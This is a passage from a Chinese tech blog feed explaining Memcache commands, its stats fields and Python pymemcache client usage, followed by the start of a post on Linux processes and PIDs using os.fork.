的数字值进行自增/自减操作.它操作的数据必须是十进制的32位无符号整数.</p><p>如果<code>key</code> 不存在返回<code>NOT_FOUND</code> ,如果<code>key</code> 不是数字,返回<code>CLIENT_ERROR</code>,其他错误返回<code>ERROR</code>.</p><p>语法:</p><pre><code class="sql">incr/decr key increment_value</code></pre><ul><li><code>incr</code> 增加.<code>decr</code> 减少.</li><li><code>increment_value</code> :增加的数值.</li></ul></blockquote><h3 id="6-统计命令"><a href="#6-统计命令" class="headerlink" title="6.统计命令"></a>6.统计命令</h3><h4 id="1-Memcache-stats"><a href="#1-Memcache-stats" class="headerlink" title="1.Memcache stats"></a>1.<code>Memcache stats</code></h4><blockquote><p>返回统计信息,如<code>PID</code> ,版本号,连接数等.</p><pre><code class="shell">❯ telnet 192.168.0.101 11211Trying 192.168.0.101...Connected to 192.168.0.101.Escape character is '^]'.stats<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>包括以下信息</p><table><thead><tr><th><code>pid</code></th><th><code>memcache</code>服务器进程ID</th></tr></thead><tbody><tr><td><code>uptime</code></td><td>服务器已运行秒数</td></tr><tr><td><code>time</code></td><td>服务器当前Unix时间戳</td></tr><tr><td><code>version</code></td><td><code>memcache</code>版本</td></tr><tr><td><code>pointer_size</code></td><td>操作系统指针大小</td></tr><tr><td><code>rusage_user</code></td><td>进程累计用户时间</td></tr><tr><td><code>rusage_system</code></td><td>进程累计系统时间</td></tr><tr><td><code>curr_connections</code></td><td>当前连接数量</td></tr><tr><td><code>total_connections</code></td><td><code>Memcached</code>运行以来连接总数</td></tr><tr><td><code>connection_structures</code></td><td><code>Memcached</code>分配的连接结构数量</td></tr><tr><td><code>cmd_get</code></td><td>get命令请求次数</td></tr><tr><td><code>cmd_set</code></td><td>set命令请求次数</td></tr><tr><td><code>cmd_flush</code></td><td>flush命令请求次数</td></tr><tr><td><code>get_hits</code></td><td>get命令命中次数</td></tr><tr><td><code>get_misses</code></td><td>get命令未命中次数</td></tr><tr><td><code>delete_misses</code></td><td>delete命令未命中次数</td></tr><tr><td><code>delete_hits</code></td><td>delete命令命中次数</td></tr><tr><td><code>incr_misses</code></td><td><code>incr</code>命令未命中次数</td></tr><tr><td><code>incr_hits</code></td><td><code>incr</code>命令命中次数</td></tr><tr><td><code>decr_misses</code></td><td><code>decr</code>命令未命中次数</td></tr><tr><td><code>decr_hits</code></td><td><code>decr</code>命令命中次数</td></tr><tr><td><code>cas_misses</code></td><td><code>cas</code>命令未命中次数</td></tr><tr><td><code>cas_hits</code></td><td><code>cas</code>命令命中次数</td></tr><tr><td><code>cas_badval</code></td><td>使用擦拭次数</td></tr><tr><td><code>auth_cmds</code></td><td>认证命令处理的次数</td></tr><tr><td><code>auth_errors</code></td><td>认证失败数目</td></tr><tr><td><code>bytes_read</code></td><td>读取总字节数</td></tr><tr><td><code>bytes_written</code></td><td>发送总字节数</td></tr><tr><td><code>limit_maxbytes</code></td><td>分配的内存总大小（字节）</td></tr><tr><td><code>accepting_conns</code></td><td>服务器是否达到过最大连接（0/1）</td></tr><tr><td><code>listen_disabled_num</code></td><td>失效的监听数</td></tr><tr><td><code>threads</code></td><td>当前线程数</td></tr><tr><td><code>conn_yields</code></td><td>连接操作主动放弃数目</td></tr><tr><td><code>bytes</code></td><td>当前存储占用的字节数</td></tr><tr><td><code>curr_items</code></td><td>当前存储的数据总数</td></tr><tr><td><code>total_items</code></td><td>启动以来存储的数据总数</td></tr><tr><td><code>evictions</code></td><td><code>LRU</code>释放的对象数目</td></tr><tr><td><code>reclaimed</code></td><td>已过期的数据条目来存储新数据的数目</td></tr></tbody></table></blockquote><h4 id="2-其他命令"><a href="#2-其他命令" class="headerlink" title="2.其他命令"></a>2.其他命令</h4><blockquote><table><thead><tr><th><code>stats items</code></th><th>显示各个<code>slab</code> 中<code>item</code>数目和存储时长</th></tr></thead><tbody><tr><td><code>stats slabs</code></td><td>显示各个<code>slab</code> 的信息</td></tr><tr><td><code>stats sizes</code></td><td>显示所有<code>item</code> 的大小和个数</td></tr><tr><td><code>flush_all time</code></td><td>清理所有的键值对,<code>time</code> 指定延迟时间.</td></tr></tbody></table></blockquote><h4 id="3-查找所有的key"><a href="#3-查找所有的key" class="headerlink" title="3.查找所有的key"></a>3.查找所有的key</h4><blockquote><pre class="line-numbers language-bash"><code class="language-bash">telnet 127.0.0.1 11211stats items  <span class="token comment" spellcheck="true"># 显示出所有的key , 1 是id值</span>STAT items:1:number 1 <span class="token comment" spellcheck="true"># 通过id获取key</span>stats cachedump 1 0  <span class="token comment" spellcheck="true"># id 为1, 0表示列出所有的内容</span><span class="token comment" spellcheck="true"># 通过上述命令获取到key</span>get key<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="Python-操作memcache"><a href="#Python-操作memcache" class="headerlink" title="Python 操作memcache"></a><code>Python</code> 操作<code>memcache</code></h2><blockquote><p><code>Python</code> 操作<code>memcache</code> 的库有很多,比如<code>pylibmc</code> ,<code>python-memcache</code>,<code>memcache_client</code>.以及<code>pymemcache</code> .</p><ul><li><code>pylibmc</code> 是在<code>c</code> 语言实现的,并不是纯<code>python</code> 实现,它和协程的工作有一定的阻碍.</li><li><code>python-memcache</code> :纯<code>pthon</code> 实现,但是不支持<code>noreply</code> ,比其他库要慢.</li><li><code>memcache-client</code>:纯<code>python</code> 实现,但是不支持大多数<code>memcache API</code>.</li><li><code>pymemcache</code> :纯<code>python</code> 实现,支持<code>noreply</code> .</li></ul><p>基于简单高效的原则,这是使用<code>pymemcache</code> .</p></blockquote><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h3><blockquote><pre class="line-numbers language-shell">$ pip install pymemcache</code></pre><p><a href="https://pymemcache.readthedocs.io/en/latest/getting_started.html#basic-usage" target="_blank" rel="noopener">官方文档</a></p></blockquote><h3 id="2-基本使用"><a href="#2-基本使用" class="headerlink" title="2.基本使用"></a>2.基本使用</h3><blockquote><p>导入客户端类,并传递数据.</p><pre><code class="python"><code class="language-shell">$ pip install pymemcache</code></pre><p><a href="https://pymemcache.readthedocs.io/en/latest/getting_started.html#basic-usage" target="_blank" rel="noopener">官方文档</a></p></blockquote><h3 id="2-基本使用"><a href="#2-基本使用" class="headerlink" title="2.基本使用"></a>2.基本使用</h3><blockquote><p>导入客户端类,并传递数据.</p><pre><code class="python">>>> from pymemcache.client.base import Client>>> help(Client)class Client(builtins.object)Client(server, serializer=None, deserializer=None, connect_timeout=None, timeout=None, no_delay=False, ignore_exc=False, socket_module=socket, key_prefix=b'', default_noreply=True, allow_unicode_keys=False, encoding='ascii')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>常用的参数有:</p><ul><li><code>server</code>:指定一个<code>tuple</code> 元组.包含<code>(ip,port)</code> .</li><li><code>allow_unicode_keys</code>:指定一个布尔值,默认是<code>False</code> ,结合<code>encoding=&#39;ascii&#39;</code> ,指定了编码字符串,指定为<code>True</code> 时,结合<code>encoding=&#39;utf8</code> ,可以使用<code>utf8</code> 编码.</li><li><code>ignore_exc</code> :默认是<code>False</code> ,<code>True</code> 会导致<code>get\gets</code> 将任何错误都视为高速缓存.</li><li><code>serializer</code> 序列化函数,接受2个值<code>key,value</code></li><li><code>deserialzer</code> :反序列化函数,接受3个值,<code>key,value,flag</code> ,更多信息<a href="https://pymemcache.readthedocs.io/en/latest/apidoc/pymemcache.client.base.html" target="_blank" rel="noopener">参照</a></li></ul><p>创建为:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pymemcache<span class="token punctuation">.</span>client<span class="token punctuation">.</span>base <span class="token keyword">import</span> Clientclient <span class="token operator">=</span> Client<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'192.168.0.101'</span><span class="token punctuation">,</span><span class="token number">11211</span><span class="token punctuation">)</span><span class="token punctuation">,</span>allow_unicode_keys<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>client</code> 拥有<code>memcached</code> 的所有方法:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> pymemcache<span class="token punctuation">.</span>client<span class="token punctuation">.</span>base <span class="token keyword">import</span> Client<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> pdir<span class="token operator">>></span><span class="token operator">></span> pdir<span class="token punctuation">(</span>Client<span class="token punctuation">)</span>function<span class="token punctuation">:</span>    add<span class="token punctuation">:</span> The memcached <span class="token string">"add"</span> command<span class="token punctuation">.</span>    append<span class="token punctuation">:</span> The memcached <span class="token string">"append"</span> command<span class="token punctuation">.</span>    cache_memlimit<span class="token punctuation">:</span> The memcached <span class="token string">"cache_memlimit"</span> command<span class="token punctuation">.</span>    cas<span class="token punctuation">:</span> The memcached <span class="token string">"cas"</span> command<span class="token punctuation">.</span>    check_key<span class="token punctuation">:</span> Checks key <span class="token operator">and</span> add key_prefix<span class="token punctuation">.</span>    close<span class="token punctuation">:</span> Close the connection to memcached<span class="token punctuation">,</span> <span class="token keyword">if</span> it <span class="token keyword">is</span> open<span class="token punctuation">.</span> The next call to a    decr<span class="token punctuation">:</span> The memcached <span class="token string">"decr"</span> command<span class="token punctuation">.</span>    delete<span class="token punctuation">:</span> The memcached <span class="token string">"delete"</span> command<span class="token punctuation">.</span>    delete_many<span class="token punctuation">:</span> A convenience function to delete multiple keys<span class="token punctuation">.</span>    delete_multi<span class="token punctuation">:</span> A convenience function to delete multiple keys<span class="token punctuation">.</span>    flush_all<span class="token punctuation">:</span> The memcached <span class="token string">"flush_all"</span> command<span class="token punctuation">.</span>    get<span class="token punctuation">:</span> The memcached <span class="token string">"get"</span> command<span class="token punctuation">,</span> but only <span class="token keyword">for</span> one key<span class="token punctuation">,</span> <span class="token keyword">as</span> a convenience<span class="token punctuation">.</span>    get_many<span class="token punctuation">:</span> The memcached <span class="token string">"get"</span> command<span class="token punctuation">.</span>    get_multi<span class="token punctuation">:</span> The memcached <span class="token string">"get"</span> command<span class="token punctuation">.</span>    gets<span class="token punctuation">:</span> The memcached <span class="token string">"gets"</span> command <span class="token keyword">for</span> one key<span class="token punctuation">,</span> <span class="token keyword">as</span> a convenience<span class="token punctuation">.</span>    gets_many<span class="token punctuation">:</span> The memcached <span class="token string">"gets"</span> command<span class="token punctuation">.</span>    incr<span class="token punctuation">:</span> The memcached <span class="token string">"incr"</span> command<span class="token punctuation">.</span>    prepend<span class="token punctuation">:</span> The memcached <span class="token string">"prepend"</span> command<span class="token punctuation">.</span>    quit<span class="token punctuation">:</span> The memcached <span class="token string">"quit"</span> command<span class="token punctuation">.</span>    replace<span class="token punctuation">:</span> The memcached <span class="token string">"replace"</span> command<span class="token punctuation">.</span>    set<span class="token punctuation">:</span> The memcached <span class="token string">"set"</span> command<span class="token punctuation">.</span>    set_many<span class="token punctuation">:</span> A convenience function <span class="token keyword">for</span> setting multiple values<span class="token punctuation">.</span>    set_multi<span class="token punctuation">:</span> A convenience function <span class="token keyword">for</span> setting multiple values<span class="token punctuation">.</span>    stats<span class="token punctuation">:</span> The memcached <span class="token string">"stats"</span> command<span class="token punctuation">.</span>    touch<span class="token punctuation">:</span> The memcached <span class="token string">"touch"</span> command<span class="token punctuation">.</span>    version<span class="token punctuation">:</span> The memcached <span class="token string">"version"</span> command<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="3-增删改查"><a href="#3-增删改查" class="headerlink" title="3.增删改查"></a>3.增删改查</h3><blockquote><ul><li><p><code>set(key, value, expire=0, noreply=None, flags=None)</code> :<code>Memcache set</code> 命令</p></li><li><p><code>set_many(values, expire=0, noreply=None, flags=None)</code> :添加多个,<code>values</code> 是一个字典对象,指定多个键值对.</p></li><li><p><code>set_multi()</code> 同<code>set_many()</code></p></li><li><p><code>add(key, value, expire=0, noreply=None, flags=None)</code> :<code>Memcache add</code> 命令.</p></li><li><p><code>append( key, value, expire=0, noreply=None, flags=None)</code>:<code>Memcache append</code> 命令</p></li><li><p><code>prepend( key, value, expire=0, noreply=None, flags=None)</code>:<code>Memcache prepend</code> 命令.</p></li><li><p><code>replace(key,value,expire=0,noreply=None,flags=None)</code> :<code>Memcache replace</code> 命令.</p></li><li><p><code>get(key, default=None)</code> :<code>Memcache get</code> 命令,<code>default</code>指定没有<code>key</code> 返回的值.</p></li><li><p><code>get_many(keys)</code> :返回多个值,<code>keys</code> 是一个<code>list</code> 列表类型.</p></li><li><p><code>get_multi(keys)</code>:同<code>get_many</code></p></li><li><p><code>gets(key, default=None, cas_default=None)</code> :<code>Memcache gets</code>命令</p></li><li><p><code>gets_many(keys)</code> :返回多个值,<code>keys</code> 是一个<code>list</code> 列表类型.</p></li><li><p><code>cas(self, key, value, cas, expire=0, noreply=False, flags=None)</code> :<code>cas</code> 只能是<code>int\str</code> 数据类型,并且只能是<code>0-9</code> .</p></li><li><p><code>stats(*args)</code> :查看各种状态</p></li><li><p><code>delete(key, noreply=None)</code>.</p></li><li><p><code>incr( key, value, noreply=False)</code></p></li><li><p><code>decr(key, value, noreply=False)</code></p></li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pymemcache<span class="token punctuation">.</span>client<span class="token punctuation">.</span>base <span class="token keyword">import</span> Clientclient <span class="token operator">=</span> Client<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'192.168.0.101'</span><span class="token punctuation">,</span><span class="token number">11211</span><span class="token punctuation">)</span><span class="token punctuation">,</span>allow_unicode_keys<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 1.存储命令</span><span class="token comment" spellcheck="true"># 增加一个</span>client<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span><span class="token string">'value'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 增加多个</span>client<span class="token punctuation">.</span>set_many<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'测试1'</span><span class="token punctuation">:</span><span class="token string">'测试1'</span><span class="token punctuation">,</span><span class="token string">'test2'</span><span class="token punctuation">:</span><span class="token string">'test2'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>expire<span class="token operator">=</span><span class="token number">120</span><span class="token punctuation">,</span>noreply<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>client<span class="token punctuation">.</span>set_multi<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'测试2'</span><span class="token punctuation">:</span><span class="token string">'test2'</span><span class="token punctuation">,</span><span class="token string">'test3'</span><span class="token punctuation">:</span><span class="token string">'test3'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>expire<span class="token operator">=</span><span class="token number">120</span><span class="token punctuation">,</span>noreply<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># add新添加</span>client<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token string">'key1'</span><span class="token punctuation">,</span><span class="token string">'value1'</span><span class="token punctuation">,</span>expire<span class="token operator">=</span><span class="token number">120</span><span class="token punctuation">,</span>noreply<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 追加</span>client<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'key1'</span><span class="token punctuation">,</span><span class="token string">'append end'</span><span class="token punctuation">,</span>expire<span class="token operator">=</span><span class="token number">120</span><span class="token punctuation">,</span>noreply<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>client<span class="token punctuation">.</span>prepend<span class="token punctuation">(</span><span class="token string">'key1'</span><span class="token punctuation">,</span><span class="token string">'prepend start'</span><span class="token punctuation">,</span>expire<span class="token operator">=</span><span class="token number">120</span><span class="token punctuation">,</span>noreply<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.查找命令</span>result <span class="token operator">=</span> client<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">)</span>result1 <span class="token operator">=</span> client<span class="token punctuation">.</span>get_many<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'测试1'</span><span class="token punctuation">,</span><span class="token string">'test2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>result2 <span class="token operator">=</span> client<span class="token punctuation">.</span>get_multi<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'测试2'</span><span class="token punctuation">,</span><span class="token string">'test3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>result3 <span class="token operator">=</span> client<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'kye1'</span><span class="token punctuation">)</span>result4 <span class="token operator">=</span> client<span class="token punctuation">.</span>gets<span class="token punctuation">(</span><span class="token string">'key1'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 删除</span>client<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 自增 自减</span>client<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token string">'age'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span>expire<span class="token operator">=</span><span class="token number">120</span><span class="token punctuation">,</span>noreply<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>client<span class="token punctuation">.</span>incr<span class="token punctuation">(</span><span class="token string">'age'</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>client<span class="token punctuation">.</span>decr<span class="token punctuation">(</span><span class="token string">'age'</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>client<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'age'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3.清空</span>client<span class="token punctuation">.</span>flush_all<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result3<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result4<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="4-分布式集群"><a href="#4-分布式集群" class="headerlink" title="4.分布式集群"></a>4.分布式集群</h3><blockquote><p>使用分布式<code>memcache</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pymemcache<span class="token punctuation">.</span>client<span class="token punctuation">.</span>hash <span class="token keyword">import</span> HashClientclient <span class="token operator">=</span> HashClient<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">11211</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">11212</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>client<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token string">'some_key'</span><span class="token punctuation">,</span> <span class="token string">'some value'</span><span class="token punctuation">)</span>result <span class="token operator">=</span> client<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'some_key'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="5-序列化"><a href="#5-序列化" class="headerlink" title="5.序列化"></a>5.序列化</h3><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pymemcache<span class="token punctuation">.</span>client<span class="token punctuation">.</span>base <span class="token keyword">import</span>  Client<span class="token keyword">import</span> json<span class="token keyword">def</span> <span class="token function">json_serializer</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">if</span> type<span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">==</span> str<span class="token punctuation">:</span>     <span class="token keyword">return</span> value<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token keyword">def</span> <span class="token function">json_deserializer</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> flags <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> value<span class="token keyword">if</span> flags <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Unknown serialization format"</span><span class="token punctuation">)</span>client <span class="token operator">=</span> Client<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'192.168.0.101'</span><span class="token punctuation">,</span> <span class="token number">11211</span><span class="token punctuation">)</span><span class="token punctuation">,</span> serializer<span class="token operator">=</span>json_serializer<span class="token punctuation">,</span>             deserializer<span class="token operator">=</span>json_deserializer<span class="token punctuation">)</span>client<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">'a'</span><span class="token punctuation">:</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">:</span><span class="token string">'d'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>result <span class="token operator">=</span> client<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出字符串</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">{</span><span class="token string">'a'</span><span class="token keyword">:</span> <span class="token string">'b'</span>, <span class="token string">'c'</span><span class="token keyword">:</span> <span class="token string">'d'</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h3 id="6-建议"><a href="#6-建议" class="headerlink" title="6.建议"></a>6.建议</h3><blockquote><ul><li><p>构造<code>Clinet</code> 时,添加<code>timeout</code> 的配置,放置<code>block</code> .</p></li><li><p>使用<code>noreply</code> 来提高性能,默认情况下,<code>set\add\replace\append\prepend\delete</code> 操作是开启的,而<code>cas\incr\decr</code> 操作是关闭的.</p></li><li><p>尽可能的使用<code>get_many\gets_many</code>操作.</p></li><li><p>使用<code>ignore_exc</code> 属性,保证在<code>get</code> 没有命中的情况下,<code>memcache</code> 杀死<code>web</code> 进程</p></li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Memcache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python进程线程</title>
      <link href="/posts/54684.html"/>
      <url>/posts/54684.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-28/1601302980292-10305.png" alt="10305"></p><h2 id="进程和线程基本概念"><a href="#进程和线程基本概念" class="headerlink" title="进程和线程基本概念"></a>进程和线程基本概念</h2><blockquote><p>这只是简单的了解<code>linux</code> 的一些基本的进程线程的概念,其次通过<code>python</code> 编写代码实例,验证这些概念.</p></blockquote><h3 id="1-进程是什么"><a href="#1-进程是什么" class="headerlink" title="1.进程是什么"></a>1.进程是什么</h3><blockquote><p>根据维基百科的<a href="https://zh.wikipedia.org/wiki/%E8%A1%8C%E7%A8%8B" target="_blank" rel="noopener">定义</a>,进程(<code>process=</code>)是计算机中已经运行程序的实体,用户下达运行程序的命令后,就会产生进程.进程需要一些资源才能完成工作,如CPU的使用事件,存储器,文件以及I/O设备.且为依序逐一进行,也就是每个CPU核心任何时间内仅能运行一项进程.</p><p>简单来说,进程就是代码运行的实体.当然,进程不一定都是运行的,也可能是等待调度或者停止.进程有其自己的状态.</p></blockquote><h3 id="2-进程的实例"><a href="#2-进程的实例" class="headerlink" title="2.进程的实例"></a>2.进程的实例</h3><blockquote><p>linux中<code>bash</code> 实例:</p><pre class="line-numbers language-bash">echo helloworld</code></pre><p>python实例:</p><pre><code class="python"><code class="language-bash">echo helloworld</code></pre><p>python实例:</p><pre><code class="python"># vim hello.pyif __name__ == '__main__':    print('hello')# python hello.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="3-PID"><a href="#3-PID" class="headerlink" title="3.PID"></a>3.<code>PID</code></h3><blockquote><p><code>PID</code>:Process ID.是标识和区分进程的<code>ID</code> ,它是全局唯一的一个正整数.</p><p>不管是运行<code>bash</code> 的实例,还是运行<code>python</code> 的实例,他们都会生成一个<code>PID</code> ,只不过运行结束后就把<code>PID</code>释放了.</p><p>python获取<code>PID</code> :</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token triple-quoted-string string">"""fork会创建一个子进程,然后复制父进程的所有信息到子进程中, 然后父进程和子进程都会从fork()函数中得到一个返回值, 在子进程中为0,而父进程是子进程的ID这是因为,一个父进程可以fork很多子进程,所以,父进程要记住每个子进程的ID,而子进程只需要用 os.getppid()就可以拿到父进程的ID"""</span>pid <span class="token operator">=</span> os<span class="token punctuation">.</span>fork<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span> <span class="token keyword">if</span> pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'这是子进程,父进程PID:{},自己进程PID:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getppid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">else</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'这是父进程,自己进程PID:{},子进程PID:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""这是父进程,自己进程PID:8804,子进程PID:8805这是子进程,父进程PID:8804,自己进程PID:8805"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进程运行时的PID是由系统随机分配的.除了<code>PID</code>(进程ID) 之外还有一个<code>PPID</code> ,这个是父进程ID</p></blockquote><h3 id="4-PPID"><a href="#4-PPID" class="headerlink" 